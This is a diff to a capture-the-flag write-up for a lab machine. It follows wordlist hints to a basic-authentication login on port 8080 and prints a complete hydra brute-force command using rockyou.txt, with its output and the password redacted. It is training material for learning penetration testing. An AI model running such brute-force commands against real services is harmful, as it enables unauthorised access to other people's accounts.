@@ -131,7 +131,7 @@ I made sure to include `-x txt,php,zip` to let gobuster know what files I am spe
 
 The other file listed in the output from gobuster is the file that tell a lot about the backend. Going to http://target.thm/phpinfo.php displays all the output from the phpinfo() function. This is something that should not make it to production.
 
-## When reading the secret file, We find with a conversation that seems contains at least two users and some keywords that can be interesting, what user do you think it is?
+## When reading the secret file, ee find with a conversation that seems contains at least two users and some keywords that can be interesting, what user do you think it is?
 
 I download the secret.txt file with the following command:
 
@@ -151,3 +151,28 @@ Joker: "HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!"
 ```
 
 There are a lot of hints in this conversation. I see two usernames batman and joker. Batman hints that he can break Joker with a rock. This is a reference that using the rockyou.txt wordlist will crack the joker. This means that joker is the user and their password is in the rockyou.txt file.
+
+## What port on this machine needs to be authenticated by Basic Authentication mechanism?
+
+Going back to the output from nmap, there is only one port that runs http left. I check port 8080 by going to http://target.thm:8080. It uses basic authentication.
+
+## At this point we have one user and a url that needs to be aunthenticated, brute force it to get the password, what is that password?
+
+I am going to use hydra with the joker username and the rockyou.txt wordlist to log into the site on port 8080. I let hydra know that I am trying to break basic authentication by using the http-get protocol in the command. Here is the command I used:
+
+```bash
+$ hydra -l joker -P /usr/share/wordlists/rockyou.txt http-get://target.thm:8080
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-02 17:46:27
+[WARNING] You must supply the web page as an additional option or via -m, default path set to /
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking http-get://target.thm:8080/
+[8080][http-get] host: target.thm   login: joker   password: REDACTED
+1 of 1 target successfully completed, 1 valid password found
+```
+
+Hydra very quickly found the password and I am able to log into the site.
+
+## Yeah!! We got the user and password and we see a cms based blog. Now check for directories and files in this port. What directory looks like as admin directory?
+
